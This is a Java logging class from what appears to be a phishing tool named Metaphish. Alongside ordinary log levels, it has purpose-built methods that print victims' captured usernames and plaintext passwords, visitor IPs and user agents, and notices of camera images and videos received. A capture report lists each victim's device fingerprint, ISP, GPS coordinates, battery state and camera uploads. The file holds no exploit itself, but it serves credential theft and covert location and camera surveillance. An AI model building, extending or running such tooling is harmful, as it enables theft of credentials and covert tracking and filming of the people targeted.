package com.metaphish.util;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.LinkedHashMap;
import java.util.Map;
import java.util.concurrent.ArrayBlockingQueue;
import java.util.concurrent.BlockingQueue;

public final class Logger {

    public enum Level {
        VERBOSE, DEBUG, INFO, WARN, ERROR
    }

    private static volatile Level   CurrentLevel    = Level.INFO;
    private static volatile boolean VerboseEnabled  = false;
    private static volatile boolean FileEnabled     = false;
    private static volatile String  LogFilePath     = "logs/metaphish.log";
    private static volatile int     MaxEntries      = 1000;

    private static final BlockingQueue<String> FileQueue          = new ArrayBlockingQueue<>(4096);
    private static final DateTimeFormatter     TimestampFormatter = DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss");
    private static Thread WriterThread;

    private Logger() {}

    public static void Configure(String LevelName, boolean IsVerbose, boolean EnableFile, String FilePath, int MaxEnt) {
        CurrentLevel   = ParseLevel(LevelName);
        VerboseEnabled = IsVerbose;
        FileEnabled    = EnableFile;
        LogFilePath    = FilePath;
        MaxEntries     = MaxEnt;
        if (EnableFile) StartFileWriter(FilePath);
    }

    private static Level ParseLevel(String LevelName) {
        try {
            return Level.valueOf(LevelName.toUpperCase());
        } catch (Exception Ignored) {
            return Level.INFO;
        }
    }

    private static void StartFileWriter(String Path) {
        java.nio.file.Path Parent = Paths.get(Path).getParent();
        if (Parent != null) {
            try { Files.createDirectories(Parent); } catch (Exception Ignored) {}
        }
        WriterThread = new Thread(() -> {
            try (BufferedWriter Writer = new BufferedWriter(new FileWriter(Path, true))) {
                while (!Thread.currentThread().isInterrupted()) {
                    try {
                        Writer.write(FileQueue.take());
                        Writer.newLine();
                        Writer.flush();
                    } catch (InterruptedException Interrupted) {
                        Thread.currentThread().interrupt();
                        break;
                    }
                }
            } catch (IOException WriteException) {
                System.out.println(AnsiColor.White + "[" + AnsiColor.BrightRed + "ERROR" + AnsiColor.White + "] "
                        + "Log file writer failed: " + WriteException.getMessage() + AnsiColor.Reset);
            }
        }, "MetaphishLogFileWriter");
        WriterThread.setDaemon(true);
        WriterThread.start();
    }

    private static String Timestamp() {
        return LocalDateTime.now().format(TimestampFormatter);
    }

    private static String Format(String Message, Object... Args) {
        if (Args == null || Args.length == 0) return Message.replace("%n", System.lineSeparator());
        try {
            return String.format(Message, Args);
        } catch (java.util.IllegalFormatException FormatException) {
            return Message + " [FORMAT_ERROR: " + FormatException.getMessage() + "]";
        }
    }

    private static void Emit(Level MessageLevel, String PlainTag, String LevelColor, String Message, Object[] Args) {
        if (MessageLevel.ordinal() < CurrentLevel.ordinal()) return;
        String Formatted = Format(Message, Args);
        String ColorLine = AnsiColor.White + "[" + LevelColor + PlainTag + AnsiColor.White + "] " + Formatted + AnsiColor.Reset;
        String PlainLine = "[" + Timestamp() + "] [" + PlainTag + "] " + Formatted;
        System.out.println(ColorLine);
        if (FileEnabled) FileQueue.offer(PlainLine);
    }

    public static void Info(String Message, Object... Args) {
        Emit(Level.INFO, "INFO", AnsiColor.Blue, Message, Args);
    }

    public static void Warn(String Message, Object... Args) {
        Emit(Level.WARN, "WARN", AnsiColor.Yellow, Message, Args);
    }

    public static void Error(String Message, Object... Args) {
        Emit(Level.ERROR, "ERROR", AnsiColor.BrightRed, Message, Args);
    }

    public static void Debug(String Message, Object... Args) {
        Emit(Level.DEBUG, "DEBUG", AnsiColor.Magenta, Message, Args);
    }

    public static void Success(String Message, Object... Args) {
        Emit(Level.INFO, "OK", AnsiColor.BrightGreen, Message, Args);
    }

    public static void Ok(String Message, Object... Args) {
        Emit(Level.INFO, "OK", AnsiColor.BrightGreen, Message, Args);
    }

    public static void Verbose(String Message, Object... Args) {
        if (!VerboseEnabled) return;
        Emit(Level.VERBOSE, "TRACE", AnsiColor.Dim, Message, Args);
    }

    public static void Custom(String Text) {
        System.out.print(Format(Text));
        System.out.flush();
    }

    public static void Custom(String Text, Object... Args) {
        System.out.print(Format(Text, Args));
        System.out.flush();
    }

    public static void Custom(String Text, long DelayMs) {
        System.out.print(Format(Text));
        System.out.flush();
        if (DelayMs > 0) {
            try { Thread.sleep(DelayMs); }
            catch (InterruptedException Interrupted) { Thread.currentThread().interrupt(); }
        }
    }

    public static void Custom(String Text, int DelayMs) {
        Custom(Text, (long) DelayMs);
    }

    public static void Visitor(String IpAddress, String UserAgent) {
        Emit(Level.INFO, "INFO", AnsiColor.Blue,
                "Visitor → IP: " + IpAddress + " | UA: " + UserAgent.substring(0, Math.min(UserAgent.length(), 60)) + "...",
                null);
    }

    public static void Capture(String IpAddress) {
        Emit(Level.INFO, "OK", AnsiColor.BrightGreen, "Data captured from " + IpAddress, null);
    }

    public static void Credential(String Username, String Password) {
        Emit(Level.WARN, "WARN", AnsiColor.Yellow,
                "Credential → User: " + Username + " | Pass: " + Password, null);
    }

    public static void Camera(String IpAddress) {
        Emit(Level.INFO, "INFO", AnsiColor.Blue, "Camera image received from " + IpAddress, null);
    }

    public static void Video(String IpAddress) {
        Emit(Level.INFO, "INFO", AnsiColor.Magenta, "Video capture received from " + IpAddress, null);
    }

    public static void Link(String Label, String Url) {
        System.out.println(AnsiColor.Colorize("[" + Label + "]", AnsiColor.Cyan, AnsiColor.Bold)
                + " " + AnsiColor.Colorize(Url, AnsiColor.BrightWhite, AnsiColor.Bold));
    }

    public static void Separator() {
        System.out.println(AnsiColor.Colorize("─".repeat(64), AnsiColor.BrightBlack));
    }

    public static void PrintCapture(int CaptureNumber, Map<String, String> Data) {
        String IpValue      = Data.getOrDefault("IpAddress", "");
        String OsValue      = Data.getOrDefault("OsName", "");
        String OsVersion    = Data.getOrDefault("OsVersion", "");
        String CountryValue = Data.getOrDefault("Country", "");
        String CityValue    = Data.getOrDefault("City", "");

        StringBuilder SummaryBuilder = new StringBuilder();
        SummaryBuilder.append(AnsiColor.White).append("  Capture #")
                .append(AnsiColor.Cyan).append(CaptureNumber).append(AnsiColor.White);
        if (!IpValue.isBlank())   SummaryBuilder.append("  ").append(AnsiColor.BrightBlack).append("▸").append(AnsiColor.White).append("  ").append(IpValue);
        if (!OsValue.isBlank())   SummaryBuilder.append("  ").append(AnsiColor.BrightBlack).append("▸").append(AnsiColor.White).append("  ").append(OsValue).append(OsVersion.isBlank() ? "" : " " + OsVersion);
        if (!CityValue.isBlank()) SummaryBuilder.append("  ").append(AnsiColor.BrightBlack).append("▸").append(AnsiColor.White).append("  ").append(CityValue).append(CountryValue.isBlank() ? "" : ", " + CountryValue);
        else if (!CountryValue.isBlank()) SummaryBuilder.append("  ").append(AnsiColor.BrightBlack).append("▸").append(AnsiColor.White).append("  ").append(CountryValue);
        SummaryBuilder.append(AnsiColor.Reset);
        System.out.println(SummaryBuilder);

        PrintCaptureSection("DEVICE",   Data, new String[]{"OsName", "OsVersion", "BrowserName", "BrowserVersion", "DeviceType", "ScreenResolution", "Language", "Timezone", "DeviceMemoryGb", "HardwareConcurrency", "MaxTouchPoints", "CookieEnabled", "PixelRatio"});
        PrintCaptureSection("NETWORK",  Data, new String[]{"IpAddress", "ISP", "ConnectionType", "EffectiveConnectionType", "DownlinkMbps", "OnlineStatus", "PageUrl", "Referrer"});
        PrintCaptureSection("LOCATION", Data, new String[]{"Country", "Region", "City", "GpsLatitude", "GpsLongitude", "GpsAccuracy", "GpsAltitude"});
        PrintCaptureSection("CAMERA",   Data, new String[]{"CameraFrontFile", "CameraBackFile", "CameraVideoFile", "CameraVideoBackFile"});
        PrintCaptureSection("MISC",     Data, new String[]{"BatteryLevel", "BatteryCharging", "Timestamp"});
    }

    private static void PrintCaptureSection(String SectionName, Map<String, String> Data, String[] Keys) {
        LinkedHashMap<String, String> SectionEntries = new LinkedHashMap<>();
        for (String Key : Keys) {
            String Value = Data.getOrDefault(Key, "");
            if (!Value.isBlank() && !Value.equals("Not Available") && !Value.equals("Not Captured")) {
                SectionEntries.put(Key, Value);
            }
        }
        if (SectionEntries.isEmpty()) return;

        System.out.println("  " + AnsiColor.BrightBlack + "▸ " + AnsiColor.Yellow + AnsiColor.Bold + SectionName + AnsiColor.Reset);
        int LabelWidth = SectionEntries.keySet().stream().mapToInt(String::length).max().orElse(16);
        for (Map.Entry<String, String> Entry : SectionEntries.entrySet()) {
            String Label = Entry.getKey();
            String Value = Entry.getValue();
            String ValueColor = AnsiColor.BrightWhite;
            if (Label.equals("GpsLatitude") || Label.equals("GpsLongitude"))                            ValueColor = AnsiColor.Cyan;
            else if (Label.equals("IpAddress"))                                                         ValueColor = AnsiColor.Orange;
            else if ((Label.equals("CameraVideoFile") || Label.equals("CameraVideoBackFile")) && Value.equals("Uploaded")) ValueColor = AnsiColor.BrightMagenta;
            else if (Label.startsWith("Camera") && Value.equals("Uploaded"))                            ValueColor = AnsiColor.BrightGreen;
            else if (Label.startsWith("Camera") && Value.contains("Denied"))                            ValueColor = AnsiColor.BrightRed;
            System.out.println("    " + AnsiColor.BrightBlack + PadRight(Label, LabelWidth) + "  "
                    + ValueColor + Value + AnsiColor.Reset);
        }
    }

    private static String PadRight(String Text, int Width) {
        if (Text.length() >= Width) return Text.substring(0, Width);
        return Text + " ".repeat(Width - Text.length());
    }

    public static void Shutdown() {
        if (WriterThread != null) WriterThread.interrupt();
    }
}
